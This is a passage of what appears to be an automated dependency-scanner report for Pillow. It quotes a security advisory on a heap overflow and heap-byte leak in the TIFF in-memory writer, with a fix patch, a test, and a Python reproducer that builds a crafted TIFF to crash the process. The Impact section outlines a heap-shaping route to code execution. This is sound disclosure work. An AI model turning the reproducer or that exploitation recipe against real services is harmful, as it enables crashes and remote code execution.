one byte forward before the next write (`seek off=369418 (loc=369417)`, `write size=5 at loc=369418`, …). Offsets 369177, 369417, 369423 and 369451 are therefore never written. They lie in the part of the buffer obtained by the `realloc()` calls at `:103` (the block grew 65536 → 196608 → 327680 → 458752 during the strip writes), which is not cleared, so the emitted file carries the previous heap contents at those positions. Holes that fall inside the initial 64 KiB are zero only because that block is `calloc`'d.\n\u003e \n\u003e The defect was introduced in e782fe721e01 (\"initial merge of wiredfool/Python-Imaging-Library-G4-Tiff-Support\", 2013-03-08), first released in Pillow 2.0.0.\n\u003e \n\u003e ## Impact\n\u003e \n\u003e Any service that accepts an image and produces a TIFF rendition into a non-file object — the usual pattern for returning or uploading the result without touching disk — is exposed to whoever supplies the image, with no non-default Pillow setting involved. The overflow additionally requires that an attacker-controlled out-of-line tag value reaches libtiff: the uploaded ImageDescription/DocumentName/XMP when the application saves the opened TIFF itself (or copies its tags into the save), or the embedded ICC profile, which survives `convert()`/`resize()`/`thumbnail()`/`copy()` in `im.info` together with the compression. Under those conditions, with a crafted single-band TIFF the uploader gets a heap out-of-bounds write in the worker process of IFD-size bytes (12 bytes per directory entry the upload carries — 126 bytes with the minimal reproducer, 2384 bytes with a 331-entry IFD) immediately past a 128 KiB-class `realloc` block, with the overwritten bytes being the tail of a tag value they chose; on the stock build the minimal reproducer is detected by glibc and kills the process (`SIGABRT`).\n\u003e \n\u003e Given two addresses leaked by a separate bug, this write has been turned into code execution against a stock build of this commit with ASLR/PIE/NX enabled and default settings (that proof-of-concept is not included with this report): a single-process stdlib `http.server` worker doing nothing but `Image.open(BytesIO(body)).save(BytesIO(), \"TIFF\")` per upload executed an attacker-chosen shell command (`id\u003e/tmp/r.XXXXXX`), answered `200` and kept serving (12/12 against a freshly started worker, 2/6 after twenty unrelated uploads; a miss normally leaves the worker running and is retryable). The two addresses (`\u0026system`, `\u0026PyBytes_Type`) were taken from an unrelated information disclosure in the same process; everything else is this bug plus properties of Pillow's TIFF reader used as a heap-shaping script. The 4.7 MB attack TIFF is a 397×165 8-bit PackBits image whose rows re-encode to exactly 65 528 bytes (strip ends at sink offset 65 536), a 63 942-byte XMP packet (tag 700) as the first out-of-line value, and ~500 private IFD entries. Because `TiffImagePlugin` turns every IFD entry into one `bytes` object in IFD order, frees an earlier entry when a later one repeats its tag number, and parses the IFD three times per request (`TiffImagePlugin.py:1258`, `:1271`, and `getexif()` from `load_end()` at `:1331`), those entries drain glibc's free lists, punch exact-size holes for every large allocation the save makes, and arrange that the 128 KiB `realloc` of the sink lands directly below a live 0x540 chunk followed by libtiff's own `TIFF` handle (`malloc(1313)` from `TIFFClientOpen`). The 2384 overflowing bytes rewrite the start of the `TIFF` struct with the command string, a zeroed `tif_dir`, `tif_diroff = 65536`, and `tif_cleanup = system` at +0x3f8; libtiff resumes `TIFFWriteDirectorySec` on the modified handle and calls `(*tif-\u003etif_cleanup)(tif)`. With gdb on `__libc_system` the call arrives as `__libc_system(\"id\u003e/tmp/r.…\") ← libtiff.so.6 ← TIFFFlush ← ImagingLibTiffEncode (src/libImaging/TiffDecode.c:1056) ← _encode (src/encode.c:139)`. Offsets are per-binary constants (glibc 2.36, CPython 3.12.14, libtiff 4.5.0, this `_imaging.so`), all obtainable from public distribution files.\n\u003e \n\u003e Independently, every compressed TIFF written to such a target that exceeds 64 KiB discloses one byte of stale heap per alignment hole (one per odd-length tag value plus possibly one before the IFD; the count is set by the tags in the uploaded file) at predictable offsets in the returned file — low bandwidth, but it is other requests' freed data. File-path and real-fd targets (`TIFFFdOpen`) are unaffected by either issue. The primitive is the same class and attacker position as the `TiffDecode.c` decode-side heap overflows CVE-2020-35654, CVE-2021-25289 and CVE-2020-10379, but on the encode path and behind the output-to-a-non-file and tag-passthrough preconditions above, with code execution additionally depending on an address leak from another bug.\n\u003e \n\u003e ## Reproducing\n\u003e \n\u003e `repro` is a single Python script that uses the installed Pillow, writes its inputs into a temporary directory. It has two parts. Each part compares saving to a file path, which goes through `TIFFFdOpen` and is correct, with the same save into an `io.BytesIO`, which goes through the `_tiffWriteProc` memory sink.\n\u003e \n\u003e **Part 1: heap overflow.** `setup_env()` builds `upload.tif` (131 198 bytes) byte by byte: a mode L, 7×8191 image with `Compression=32773` (PackBits) and a 65 535-character `ImageDescription`. The sizes are picked so that when Pillow re-encodes the pixels, the strip comes to 8 + 8191 × 8 = 65 536 bytes and ends exactly at the sink's initial 64 KiB buffer. libtiff then seeks past the 126-byte IFD and writes the 65 536-byte description at offset 65 662. The sink grows only to 131 072 bytes, so the last 126 bytes of the description are written past the end of the heap block. In a fresh child process, the script runs `Image.open(\"upload.tif\").save(\u003ctarget\u003e, \"TIFF\")` with no options, once with `\"out.tif\"` as the target and once with `io.BytesIO()`. The file save exits with 0. The BytesIO save is killed by SIGABRT, with glibc reporting `malloc(): corrupted top size`.\n\u003e \n\u003e **Part 2: stale heap bytes in the output.** A child started with `MALLOC_PERTURB_=170` (glibc fills fresh allocations with 0x55) saves a seeded-noise 300×300 RGB image with `compression=\"tiff_lzw\"` and four odd-length ASCII tags. It saves once to a file and once to a BytesIO, then prints every offset where the two outputs differ. libtiff skips one pad byte before the IFD and one after each odd-length tag value. The file has 0x00 at those offsets, but the BytesIO output still holds the 0x55 that was in uninitialised `realloc()` memory.\n\u003e \n\u003e Expected output on this tree:\n\u003e \n\u003e ```\n\u003e upload.tif: 131198 bytes\n\u003e save to file path : exit code 0, out.tif = 131210 bytes\n\u003e save to BytesIO   : exit code -6, stderr: 'malloc(): corrupted top size'\n\u003e -\u003e heap overflow crashed the process: True\n\u003e \n\u003e same image, same options, saved to a file path vs. to a BytesIO:\n\u003e   offset 369177: file 0x00   BytesIO 0x55\n\u003e   offset 369417: file 0x00   BytesIO 0x55\n\u003e   offset 369423: file 0x00   BytesIO 0x55\n\u003e   offset 369451: file 0x00   BytesIO 0x55\n\u003e \n\u003e -\u003e BytesIO output contains never-written heap bytes: True\n\u003e \n\u003e BUG\n\u003e ```\n\u003e \n\u003e The last line is `BUG` if either part shows its defect, and `OK` otherwise. With the attached patch applied and rebuilt, the BytesIO save exits with 0, the two outputs are identical, and the script prints `OK`.\n\u003e \n\u003e ## Suggested fix\n\u003e \n\u003e The attached patch makes `_tiffWriteProc` in `src/libImaging/TiffDecode.c` honour sparse-file semantics: it sizes the buffer from the write position, and zeroes what `realloc()` adds (the initial block is already `calloc`'d, so every byte libtiff skips then reads as 0, exactly as through `TIFFFdOpen`). For the non-reallocating case (`flrealloc == 0`), where `loc \u003e size` would also make `to_write` negative, it rejects the write with a `TIFFError`, the same idiom `_tiffReadProc` uses:\n\u003e \n\u003e ```diff\n\u003e -        while (newsize \u003c (size + state-\u003esize)) {\n\u003e +        while (newsize \u003c (size + (tsize_t)state-\u003eloc)) {\n\u003e  …\n\u003e +        memset((UINT8 *)new_data + state-\u003esize, 0, newsize - state-\u003esize);\n\u003e          state-\u003edata = new_data;\n\u003e          state-\u003esize = newsize;\n\u003e          to_write = size;\n\u003e +    } else if (to_write \u003c 0) {\n\u003e +        TIFFError(\"_tiffWriteProc\", \"Invalid Write at loc %\" PRIu64 \", size: %\" PRIu64, …);\n\u003e +        return 0;\n\u003e      }\n\u003e ```\n\u003e \n\u003e `_tiffSeekProc` is left unconstrained, since libtiff legitimately seeks past the end of data; with the write proc fixed, `eof` can no longer exceed `size`, so the read-out in `ImagingLibTiffEncode` (`:1067`, `:1073`) stays within the block. The patch also adds `test_save_bytesio_seek_past_end` to `Tests/test_file_libtiff.py`, which saves the PackBits 64 KiB-boundary case and an LZW case with odd-length tags to both a file and a `BytesIO` and asserts the outputs are identical. With the patch applied and rebuilt, the BytesIO output is byte-identical to the file output, no AddressSanitizer report is produced for tag lengths 65410/65535/131071/196607, the code-execution chain described under Impact no longer runs its command, and the existing TIFF tests pass.\n\u003e \n\u003e ## The patch\n\u003e \n\u003e Size the libtiff in-memory write buffer from the write position, not its current size, and zero the space added by realloc in _tiffWriteProc\n\u003e \n\u003e Applies to `src/libImaging/TiffDecode.c` at the commit above.\n\u003e \n\u003e ```diff\n\u003e diff --git a/Tests/test_file_libtiff.py b/Tests/test_file_libtiff.py\n\u003e index 3d804ea4a..d2a926a62 100644\n\u003e --- a/Tests/test_file_libtiff.py\n\u003e +++ b/Tests/test_file_libtiff.py\n\u003e @@ -760,6 +760,38 @@ class TestFileLibTiff(LibTiffTestCase):\n\u003e          save_bytesio(\"packbits\")\n\u003e          save_bytesio(\"tiff_lzw\")\n\u003e  \n\u003e +    def test_save_bytesio_seek_past_end(self, tmp_path: Path) -\u003e None:\n\u003e +        # When writing the directory, libtiff seeks past the end of the data\n\u003e +        # written so far, and then writes the tag values there. Check that the\n\u003e +        # in-memory write buffer grows to fit, and that the bytes that are\n\u003e +        # skipped over are zero, as they would be when writing to a file.\n\u003e +\n\u003e +        # 7 distinct bytes per row: PackBits emits 8 bytes per row, so the strip\n\u003e +        # plus the header are exactly 64 KiB, the initial size of the buffer\n\u003e +        im = Image.new(\"L\", (7, 8191))\n\u003e +        im.putdata([(i * 37) \u0026 0xFF for i in range(7 * 8191)])\n\u003e +        kwargs = {\"compression\": \"packbits\", \"description\": \"D\" * 65535}\n\u003e +\n\u003e +        outfile = tmp_path / \"temp.tif\"\n\u003e +        im.save(outfile, **kwargs)\n\u003e +        buffer_io = io.BytesIO()\n\u003e +        im.save(buffer_io, format=\"tiff\", **kwargs)\n\u003e +        assert buffer_io.getvalue() == outfile.read_bytes()\n\u003e +\n\u003e +        # odd-length tag values, so that libtiff pads between them. Large enough\n\u003e +        # that the buffer has to be reallocated\n\u003e +        im = hopper().resize((300, 300))\n\u003e +        kwargs = {\n\u003e +            \"compression\": \"tiff_lzw\",\n\u003e +            \"description\": \"abcdef\",\n\u003e +            \"software\": \"xyz0\",\n\u003e +            \"tiffinfo\": {315: \"artist\", 33432: \"copyright!\"},\n\u003e +        }\n\u003e +        im.save(outfile, **kwargs)\n\u003e +        buffer_io = io.BytesIO()\n\u003e +        im.save(buffer_io, format=\"tiff\", **kwargs)\n\u003e +        assert buffer_io.getvalue() == outfile.read_bytes()\n\u003e +\n\u003e      def test_save_ycbcr(self, tmp_path: Path) -\u003e None:\n\u003e          im = hopper(\"YCbCr\")\n\u003e          outfile = tmp_path / \"temp.tif\"\n\u003e diff --git a/src/libImaging/TiffDecode.c b/src/libImaging/TiffDecode.c\n\u003e index 8a57c523d..dd9945493 100644\n\u003e --- a/src/libImaging/TiffDecode.c\n\u003e +++ b/src/libImaging/TiffDecode.c\n\u003e @@ -87,11 +87,13 @@ _tiffWriteProc(thandle_t hdata, tdata_t buf, tsize_t size) {\n\u003e      TRACE((\"_tiffWriteProc: %d \\n\", (int)size));\n\u003e      dump_state(state);\n\u003e  \n\u003e +    // libtiff may have seeked past the end of the buffer, e.g. when writing the\n\u003e +    // directory, so the required size is based on the current location.\n\u003e      to_write = MIN(size, state-\u003esize - (tsize_t)state-\u003eloc);\n\u003e      if (state-\u003eflrealloc \u0026\u0026 size \u003e to_write) {\n\u003e          tdata_t new_data;\n\u003e          tsize_t newsize = state-\u003esize;\n\u003e -        while (newsize \u003c (size + state-\u003esize)) {\n\u003e +        while (newsize \u003c (size + (tsize_t)state-\u003eloc)) {\n\u003e              if (newsize \u003e INT_MAX - 64 * 1024) {\n\u003e                  return 0;\n\u003e              }\n\u003e @@ -105,9 +107,20 @@ _tiffWriteProc(thandle_t hdata, tdata_t buf, tsize_t size) {\n\u003e              // fail out\n\u003e              return 0;\n\u003e          }\n\u003e +        // zero the new space, so that any bytes libtiff seeks over without\n\u003e +        // writing are 0 in the output, as they would be in a file\n\u003e +        memset((UINT8 *)new_data + state-\u003esize, 0, newsize - state-\u003esize);\n\u003e          state-\u003edata = new_data;\n\u003e          state-\u003esize = newsize;\n\u003e          to_write = size;\n\u003e +    } else if (to_write \u003c 0) {\n\u003e +        TIFFError(\n\u003e +            \"_tiffWriteProc\",\n\u003e +            \"Invalid Write at loc %\" PRIu64 \", size: %\" PRIu64,\n\u003e +            state-\u003eloc,\n\u003e +            (toff_t)state-\u003esize\n\u003e +        );\n\u003e +        return 0;\n\u003e      }\n\u003e  \n\u003e      TRACE((\"to_write: %d\\n\", (int)to_write));\n\u003e ```\n\u003e \n\u003e ## The reproducer\n\u003e \n\u003e \u003cdetails\u003e\n\u003e \u003csummary\u003eReproducer — \u003ccode\u003erepro\u003c/code\u003e, 5,434 bytes (click to open)\u003c/summary\u003e\n\u003e \n\u003e Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\u003e \n\u003e ```python\n\u003e #!/usr/bin/env python3\n\u003e \"\"\"\n\u003e Pillow: heap overflow + stale heap bytes in the libtiff in-memory write sink\n\u003e (_tiffWriteProc, src/libImaging/TiffDecode.c).\n\u003e \n\u003e im.save(\u003cBytesIO\u003e, \"TIFF\") with any compression goes through libtiff writing\n\u003e into Pillow's memory sink. When libtiff writes the directory it seeks *past*\n\u003e the end of the data written so far and writes tag values there:\n\u003e \n\u003e   1. _tiffWriteProc grows the buffer to `size + write_len` instead of\n\u003e      `loc + write_len`, so that write can run off the end of the allocation.\n\u003e   2. The bytes libtiff skipped over are never written, so whatever the heap\n\u003e      held there ends up in the output file.\n\u003e \n\u003e The same saves to a file path are fine (the kernel zero-fills skipped bytes),\n\u003e which is the control for both parts.\n\u003e \"\"\"\n\u003e import os\n\u003e import resource\n\u003e import struct\n\u003e import subprocess\n\u003e import sys\n\u003e import tempfile\n\u003e \n\u003e resource.setrlimit(resource.RLIMIT_CORE, (0, 0))   # the overflow aborts; no core file\n\u003e os.chdir(tempfile.mkdtemp())\n\u003e \n\u003e \n\u003e def run(code, **env):\n\u003e     \"\"\"Run a Python snippet against the installed Pillow in a fresh process.\"\"\"\n\u003e     return subprocess.run([sys.executable, \"-c\", code], env={**os.environ, **env},\n\u003e                           capture_output=True, text=True)\n\u003e \n\u003e \n\u003e def setup_env():\n\u003e     \"\"\"Write upload.tif: an L-mode 7x8191 PackBits TIFF with a 65535-char ImageDescription.\n\u003e \n\u003e     Sizes are chosen so that, when Pillow re-encodes it:\n\u003e       - the PackBits strip is 8191 rows x 8 bytes + 8-byte header = 65536 bytes,\n\u003e         i.e. the data ends exactly at the sink's initial 64 KiB buffer;\n\u003e       - the first out-of-line tag value (ImageDescription + NUL) is 65536 bytes\n\u003e         and goes at 65536 + 126 (the 10-entry IFD sits in between).\n\u003e     The sink grows to 65536 + 65536 = 131072 bytes, then writes [65662, 131198):\n\u003e     the last 126 bytes of the description land past the end of the heap block.\n\u003e     \"\"\"\n\u003e     w, h = 7, 8191\n\u003e     # 7 distinct bytes per row -\u003e PackBits can only emit one literal run: 1 + 7 bytes\n\u003e     strip = b\"\".join(b\"\\x06\" + bytes((y * 7 + x) * 37 \u0026 0xFF for x in range(w)) for y in range(h))\n\u003e     desc = b\"D\" * 65535 + b\"\\x00\"\n\u003e     strip_off, desc_off = 8, 8 + len(strip)\n\u003e     ifd_off = desc_off + len(desc)\n\u003e     entries = [\n\u003e         (256, 4, 1, w),                  # ImageWidth\n\u003e         (257, 4, 1, h),                  # ImageLength\n\u003e         (258, 3, 1, 8),                  # BitsPerSample\n\u003e         (259, 3, 1, 32773),              # Compression = PackBits (inherited by save())\n\u003e         (262, 3, 1, 1),                  # PhotometricInterpretation = BlackIsZero\n\u003e         (270, 2, len(desc), desc_off),   # ImageDescription (carried into save() via tag_v2)\n\u003e         (273, 4, 1, strip_off),          # StripOffsets\n\u003e         (277, 3, 1, 1),                  # SamplesPerPixel\n\u003e         (278, 4, 1, h),                  # RowsPerStrip\n\u003e         (279, 4, 1, len(strip)),         # StripByteCounts\n\u003e     ]\n\u003e     ifd = struct.pack(\"\u003cH\", len(entries))\n\u003e     ifd += b\"\".join(struct.pack(\"\u003cHHII\", *e) for e in entries)\n\u003e     ifd += struct.pack(\"\u003cI\", 0)\n\u003e     with open(\"upload.tif\", \"wb\") as f:\n\u003e         f.write(struct.pack(\"\u003c2sHI\", b\"II\", 42, ifd_off) + strip + desc + ifd)\n\u003e \n\u003e \n\u003e # ---------------------------------------------------------------------------\n\u003e # Part 1: heap buffer overflow. Re-save an uploaded TIFF with no options.\n\u003e # ---------------------------------------------------------------------------\n\u003e setup_env()\n\u003e print(f\"upload.tif: {os.path.getsize('upload.tif')} bytes\")\n\u003e \n\u003e RESAVE = 'from PIL import Image; import io; Image.open(\"upload.tif\").save({target}, \"TIFF\")'\n\u003e \n\u003e # Control: saving to a file path (real fd, no memory sink) works\n\u003e control = run(RESAVE.format(target='\"out.tif\"'))\n\u003e print(f\"save to file path : exit code {control.returncode}, out.tif = {os.path.getsize('out.tif')} bytes\")\n\u003e \n\u003e # PoC: the identical save into a BytesIO\n\u003e poc = run(RESAVE.format(target=\"io.BytesIO()\"))\n\u003e print(f\"save to BytesIO   : exit code {poc.returncode}, stderr: {poc.stderr.strip()!r}\")\n\u003e \n\u003e # A process killed by a signal (SIGABRT from glibc's heap check) = heap corrupted\n\u003e overflow = control.returncode == 0 and poc.returncode \u003c 0\n\u003e print(f\"-\u003e heap overflow crashed the process: {overflow}\\n\")\n\u003e \n\u003e \n\u003e # ---------------------------------------------------------------------------\n\u003e # Part 2: stale heap bytes in the output. MALLOC_PERTURB_=170 makes glibc fill\n\u003e # fresh allocations with 0x55, so never-written bytes become visible.\n\u003e # ---------------------------------------------------------------------------\n\u003e STALE = r'''\n\u003e import io, random\n\u003e from PIL import Image\n\u003e random.seed(1)\n\u003e im = Image.new(\"RGB\", (300, 300))      # noise -\u003e ~360 KB LZW, so the sink must realloc()\n\u003e im.putdata([tuple(random.randrange(256) for _ in \"rgb\") for _ in range(300 * 300)])\n\u003e # odd-length ASCII tags: libtiff skips one pad byte after each\n\u003e kw = dict(compression=\"tiff_lzw\", description=\"abcdef\", software=\"xyz0\",\n\u003e           tiffinfo={315: \"artist\", 33432: \"copyright!\", 306: \"2024:01:01 00:00:00\"})\n\u003e im.save(\"ref.tif\", \"TIFF\", **kw)\n\u003e buf = io.BytesIO()\n\u003e im.save(buf, \"TIFF\", **kw)\n\u003e a, b = open(\"ref.tif\", \"rb\").read(), buf.getvalue()\n\u003e for i in (i for i in range(len(a)) if a[i] != b[i]):\n\u003e     print(f\"  offset {i}: file 0x{a[i]:02x}   BytesIO 0x{b[i]:02x}\")\n\u003e '''\n\u003e stale = run(STALE, MALLOC_PERTURB_=\"170\").stdout\n\u003e print(\"same image, same options, saved to a file path vs. to a BytesIO:\")\n\u003e print(stale or \"  outputs identical\")\n\u003e leak = \"BytesIO 0x55\" in stale\n\u003e print(f\"-\u003e BytesIO output contains never-written heap bytes: {leak}\\n\")\n\u003e \n\u003e print(\"BUG\" if overflow or leak else \"OK\")\n\u003e ```\n\u003e \u003c/details\u003e\n\u003e \n\u003e ---\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | pillow | 12.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-332p-7hrc-92wf | pillow | 13.0.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-112393\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-112393](https://osv.dev/CVE-2026-112393)**.\n\n## [GHSA-332p-7hrc-92wf](https://osv.dev/GHSA-332p-7hrc-92wf)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ```\n\u003e ============================================================================\n\u003e Heap buffer overflow in _tiffWriteProc when saving TIFF to BytesIO\n\u003e Location: src/libImaging/TiffDecode.c:94  in _tiffWriteProc()\n\u003e Commit:   a707c6b21c313880d0771e54965d142dd42358b6\n\u003e ============================================================================\n\u003e ```\n\u003e \n\u003e Pillow can write attacker-chosen data past the end of a heap buffer when it saves a TIFF image to an in-memory destination such as `io.BytesIO` rather than to a file. The same code also copies leftover heap memory from the process into the saved file. Anyone who can supply an image to a service that opens it and re-saves it as TIFF this way can trigger this with default settings. The attached reproducer crashes the process, and the overflow could potentially be developed further, but code execution is not demonstrated here.\n\u003e \n\u003e The bug is in `_tiffWriteProc` in `src/libImaging/TiffDecode.c`. This is the write callback for the in-memory sink that Pillow gives libtiff whenever the save target has no `fileno()`. While writing the directory, libtiff seeks past the current end of data and writes tag values there. `_tiffWriteProc` sizes its `realloc()` from `state-\u003esize + size` instead of from the write position `state-\u003eloc`. As a result, the first out-of-line tag value written after that seek can run past the allocation by up to the size of the directory: 12 bytes per entry, 126 bytes in the minimal case, and 2384 bytes observed with a 331-entry directory. The overflowing bytes are the tail of a tag value taken from the uploaded file.\n\u003e \n\u003e No save options are needed, because compression and tags are inherited from the source image. The overflow does require an attacker-sized out-of-line tag to reach libtiff. That happens when the opened TIFF is saved directly (ImageDescription, DocumentName or XMP), or through an embedded ICC profile, which survives `copy()` in `im.info`. The bytes libtiff skips for alignment are never initialised, so any compressed TIFF over 64 KiB written this way also leaks one stale heap byte per padding hole. That leak needs no crafted tag.\n\u003e \n\u003e The attached reproducer builds a 131 KB PackBits TIFF and runs `Image.open(...).save(io.BytesIO(), \"TIFF\")`. Saving the same image to a file path succeeds, but the `BytesIO` save aborts with glibc's `malloc(): corrupted top size`. A second part of the script shows uninitialised heap bytes at the padding offsets of a `BytesIO` save that are zero in the file save. Saves to real files are unaffected. The defect dates to e782fe721e01 (2013) and has been present since Pillow 2.0.0.\n\u003e \n\u003e ## Details\n\u003e \n\u003e When `im.save()` writes a TIFF through libtiff to a target that has no usable `fileno()` (`io.BytesIO`, an HTTP response object, a storage backend stream), libtiff is opened with `TIFFClientOpen()` on Pillow's own in-memory sink, `_tiffWriteProc` / `_tiffSeekProc` in `src/libImaging/TiffDecode.c`. libtiff treats that sink like a file: when it writes the directory it seeks *beyond* the current end of data (to `eof + IFD size`, where the out-of-line tag values go, and one byte further after every odd-length tag value to keep offsets even) and writes there. On a real file the kernel grows the file and zero-fills the gap. The memory sink does neither correctly:\n\u003e \n\u003e 1. `_tiffWriteProc` sizes its `realloc()` from `state-\u003esize + size` instead of `state-\u003eloc + size`, so the first write after such a seek can land past the end of the new allocation — a heap buffer overflow whose content is tag data taken from the image being saved.\n\u003e 2. The bytes that libtiff skips are never written, and the grown region is a bare `realloc()`, so they reach the output TIFF with whatever the heap held before.\n\u003e \n\u003e Both are reachable with default settings by the ordinary \"re-encode the upload\" sequence `Image.open(upload); im.save(io.BytesIO(), \"TIFF\")` with no save options: `compression` defaults to the source file's (`src/PIL/TiffImagePlugin.py:1734`), any compression other than raw selects the libtiff writer (`:1746`), the source's `tag_v2` entries are passed through to libtiff (`:1959`), and a target without `fileno()` leaves `_fp = 0` (`:1928-1935`), i.e. the memory sink. The overflow half additionally needs an attacker-controlled out-of-line tag value of the right length to reach libtiff. With the opened `TiffImageFile` saved directly (`tag_v2` passthrough) that can be a ~64 KiB ASCII tag (269/270/271/272) or the XMP packet (tag 700, type BYTE — arbitrary bytes), and the number of tags the upload carries sets the IFD size, i.e. the overrun length (12 bytes per entry; 2384 bytes with a 331-entry IFD observed). After `convert()`/`resize()`/`thumbnail()`/`copy()` the `tag_v2` entries are gone, but `im.info[\"compression\"]` (still selecting libtiff) and `im.info[\"icc_profile\"]` survive and the ICC profile is written as tag 34675 (`:1822-1824`), an equally attacker-controlled out-of-line value: `Image.open(x).copy().save(BytesIO(), \"TIFF\")` with the payload in the ICC profile produces the identical ASan report. The stale-byte half needs no attacker tag at all.\n\u003e \n\u003e **Proof (overflow).** A 131 198-byte hand-built TIFF — mode L, 7×8191, `Compression=32773` (PackBits), an `ImageDescription` of 65 535 characters — opened with `Image.open()` and saved with `im.save(io.BytesIO(), \"TIFF\")` aborts a stock build with glibc's `malloc(): corrupted top size`. The same call against an AddressSanitizer build of the C extensions reports\n\u003e \n\u003e ```\n\u003e AddressSanitizer: heap-buffer-overflow ... WRITE of size 65536\n\u003e  #1 _tiffWriteProc src/libImaging/TiffDecode.c:115\n\u003e  #4 TIFFFlush\n\u003e  #5 ImagingLibTiffEncode src/libImaging/TiffDecode.c:1056\n\u003e 0 bytes to the right of 131072-byte region, allocated by realloc in _tiffWriteProc src/libImaging/TiffDecode.c:103\n\u003e ```\n\u003e \n\u003e **Proof (uninitialised bytes).** Saving one 300×300 RGB image as `compression=\"tiff_lzw\"` with four odd-length ASCII tags to a `BytesIO`, once with `MALLOC_PERTURB_=1` (glibc fills fresh allocations with 0xfe) and once with `MALLOC_PERTURB_=170` (0x55), gives two 369 463-byte TIFFs that differ in exactly 4 bytes, 0xfe vs 0x55, at offsets 369177, 369417, 369423, 369451 — the pad byte between the odd-length last strip and the IFD, and the pad byte after each odd-length tag value except the last. The same save to a filename gives byte-identical files with 0x00 there. Without any allocator tweaks, after a few 64 KB–400 KB Python `bytes` objects filled with 0xa7 are created and freed, re-saving an uploaded LZW TIFF carrying ten odd-length ASCII tags yields 0xa7 at all nine pad offsets.\n\u003e \n\u003e ### Code walk-through\n\u003e \n\u003e The sink's state is `{data, size (allocated), loc (position), eof (high-water mark)}`; the encoder path starts it as a zeroed 64 KiB block (`TiffDecode.c:863`, `calloc(bufsize, 1)` with `bufsize = 64*1024`, `flrealloc = 1`). Seeking is unconstrained:\n\u003e \n\u003e ```c\n\u003e /* src/libImaging/TiffDecode.c:124-141  _tiffSeekProc */\n\u003e     case 0: state-\u003eloc = off;            break;   /* may exceed eof and size */\n\u003e     case 1: state-\u003eloc += off;           break;\n\u003e     case 2: state-\u003eloc = state-\u003eeof + off; break;\n\u003e ```\n\u003e \n\u003e and writing assumes `loc \u003c= size`:\n\u003e \n\u003e ```c\n\u003e /* src/libImaging/TiffDecode.c:90-117  _tiffWriteProc */\n\u003e     to_write = MIN(size, state-\u003esize - (tsize_t)state-\u003eloc);   /* negative if loc \u003e size */\n\u003e     if (state-\u003eflrealloc \u0026\u0026 size \u003e to_write) {\n\u003e         tsize_t newsize = state-\u003esize;\n\u003e         while (newsize \u003c (size + state-\u003esize)) {               /* capacity target ignores loc */\n\u003e             …\n\u003e             newsize += 64 * 1024;\n\u003e         }\n\u003e         new_data = realloc(state-\u003edata, newsize);              /* tail left uninitialised */\n\u003e         …\n\u003e         state-\u003esize = newsize;\n\u003e         to_write = size;\n\u003e     }\n\u003e     _TIFFmemcpy((UINT8 *)state-\u003edata + state-\u003eloc, buf, to_write);   /* :115 */\n\u003e     state-\u003eloc += (toff_t)to_write;\n\u003e     state-\u003eeof = MAX(state-\u003eloc, state-\u003eeof);\n\u003e ```\n\u003e \n\u003e A gdb trace of the sink calls during the overflowing save (stock build, breakpoints on the two procs) shows how libtiff drives it:\n\u003e \n\u003e ```\n\u003e write size=63064 at loc=8      (eof=8     size=65536)     strip data (PackBits re-encode:\n\u003e write size=2464  at loc=63072  (eof=63072 size=65536)      8 bytes/row × 8191 rows)\n\u003e seek  off=0     whence=2       -\u003e loc=65536 = eof = size   TIFFWriteDirectory: end of data, already even\n\u003e seek  off=4;  write size=4 at loc=4                        link IFD offset into header\n\u003e seek  off=65662 whence=0       (eof=65536 size=65536)      65536 + 126-byte IFD (10 entries) = tag data area\n\u003e write size=65536 at loc=65662  (eof=65536 size=65536)      ImageDescription, first out-of-line value\n\u003e ```\n\u003e \n\u003e For that last call `to_write = 65536 − 65662 = −126`, the loop grows `newsize` until it is ≥ `65536 + 65536`, i.e. to 131072, and the `memcpy` writes `[65662, 131198)` into a 131072-byte block: 126 bytes past the end, containing the last 126 bytes of the description string. `loc`/`eof` become 131198 \u003e `size`; `ImagingLibTiffEncode` later sets `size = eof` (`:1067`) and copies `[0, eof)` out of the same block (`:1073`), reading past it as well.\n\u003e \n\u003e The general condition is: at directory-write time the strip data ends within *IFD-size* bytes of the current allocation boundary, and the first out-of-line tag value has a length just below a multiple of 64 KiB. The overrun length is `IFD size + pad − slack`, so it grows by 12 bytes per additional tag. For single-band images (L, P, 1, I;16, F…) `BitsPerSample` is stored inline and the first out-of-line value in tag order is `DocumentName` (269) or `ImageDescription` (270) — both free-length ASCII strings taken from the source file. Pillow re-encodes the pixels itself, but with PackBits the compressed size is a deterministic function of attacker-chosen pixel rows (the reproducer uses rows of 7 distinct bytes → 8 bytes per row → exactly 65536 bytes including the 8-byte header), so the attacker controls both quantities. For multi-band images the 6-byte `BitsPerSample` array is written first and absorbs the growth, which is why RGB sources do not hit the overflow.\n\u003e \n\u003e The disclosure half is the benign version of the same sequence. In the LZW/RGB trace the strip data ends at the odd offset 369177; libtiff places the IFD at 369178 and the tag values from 369364 on, and after each odd-length value seeks one byte forward before the next write (`seek off=369418 (loc=369417)`, `write size=5 at loc=369418`, …). Offsets 369177, 369417, 369423 and 369451 are therefore never written. They lie in the part of the buffer obtained by the `realloc()` calls at `:103` (the block grew 65536 → 196608 → 327680 → 458752 during the strip writes), which is not cleared, so the emitted file carries the previous heap contents at those positions. Holes that fall inside the initial 64 KiB are zero only because that block is `calloc`'d.\n\u003e \n\u003e The defect was introduced in e782fe721e01 (\"initial merge of wiredfool/Python-Imaging-Library-G4-Tiff-Support\", 2013-03-08), first released in Pillow 2.0.0.\n\u003e \n\u003e ## Impact\n\u003e \n\u003e 